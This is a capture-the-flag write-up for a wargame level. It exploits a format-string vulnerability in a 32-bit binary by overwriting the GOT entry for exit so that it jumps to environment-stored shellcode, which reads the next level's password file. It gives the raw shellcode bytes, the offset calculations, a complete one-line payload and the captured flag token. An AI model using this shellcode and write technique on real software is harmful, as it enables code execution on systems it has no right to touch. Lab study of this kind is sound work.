# level05

1. Overview / Plan

   * Vulnerability: **format string** in `printf(local_78)`, followed immediately by a call to `exit@plt`. Because `exit` is called right after `printf`, overwriting the **GOT entry of `exit`** with a pointer to attacker‑controlled shellcode gives code execution.
   * Shellcode location: put the payload in the **environment** (`SHELLCODE`) so we can leak its address with `getenv`.
   * Architecture: **32‑bit x86**, little‑endian. We will write the 32‑bit target address via two **half‑word** writes using `%hn`.

2. Relevant decompiled code (Ghidra / pseudo‑C)

```c
void main(void) {
  byte local_78[100];
  uint i = 0;
  fgets((char*)local_78, 100, stdin);
  i = 0;
  while (1) {
    // compute strlen(local_78) in a quirky way
    size_t len = strlen((char*)local_78);
    if (i >= len) {
      printf((char*)local_78);   // VULNERABLE: user string as format
      exit(0);                    // immediately calls exit@plt
    }
    // fold A..Z -> a..z (XOR 0x20)
    if ('@' < (char)local_78[i] && (char)local_78[i] < '[') {
      local_78[i] ^= 0x20;
    }
    i++;
  }
}
```

Notes:

* The **case‑folding** step lowercases `A..Z`. Keep format specifiers in **lowercase** (e.g., `%hn`, `%p`, `%c`). Raw address bytes (`\xe0\x97\x04\x08`, etc.) are non‑alphabetic and unaffected.

3. Place shellcode in the environment & leak its address

   Export shellcode that opens/reads `/home/users/level06/.pass` and prints it:

```bash
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'
```

Leak the pointer with a 32‑bit helper (example output shown):

```bash
printf '%s\n' '#include <stdio.h>' '#include <stdlib.h>' \
'int main(void){ printf("%p\n", getenv("SHELLCODE")); return 0; }' \
> /tmp/_tmp.c && gcc -O2 -m32 /tmp/_tmp.c -o /tmp/_tmp && /tmp/_tmp && rm -f /tmp/_tmp /tmp/_tmp.c
# example leak
0xffffd8a9
```

4. Choose the target: `exit@plt` → GOT entry

   Disassembly of the PLT stub shows the **indirect jump** through the GOT at `0x080497e0`:

```gdb
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

We will overwrite:

* `0x080497e0` (low halfword)
* `0x080497e2` (high halfword)

with the leaked address **`0xffffd8a9`** (low = `0xd8a9`, high = `0xffff`).

5. Argument position for writes

   In this binary, placing the two addresses at the start of the input makes them the **10th** and **11th** variadic arguments for `printf`.
   We will therefore use `%10$hn` and `%11$hn`.

6. Compute the print counts (mod 65536)

   Initial printed count = **8** (the two 4‑byte addresses themselves).

   Goal 1 (write low half first to keep counts monotonic):

   * Target low half = `0xd8a9` = **55465**.
   * We already printed 8, so print **55465 − 8 = 55457** more via `%55457c` → total becomes 55465; `%10$hn` writes `0xd8a9` to `0x080497e0`.

   Goal 2 (write high half):

   * Target high half = `0xffff` = **65535**.
   * Current total = 55465, so print **65535 − 55465 = 10070** more via `%10070c`; `%11$hn` writes `0xffff` to `0x080497e2`.

7. Final payload & run

```bash
python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55457c%10\$hn' + '%10070c%11\$hn' + '\n'" | ./level05
# output (token):
# h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

Explanation:

* `\x08\x04\x97\xe0'[::-1]` → `\xe0\x97\x04\x08` = little‑endian bytes of `0x080497e0` (exit@GOT low half).
* `\x08\x04\x97\xe2'[::-1]` → `\xe2\x97\x04\x08` = little‑endian bytes of `0x080497e2` (exit@GOT high half).
* `%55457c%10$hn` writes `0xd8a9` into low half.
* `%10070c%11$hn` advances the total to `0xffff` and writes it into high half.
* When `printf` returns, the program calls `exit@plt`; our GOT overwrite jumps to **`0xffffd8a9`** (the env shellcode), which prints the target file.

8. Token

```text
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
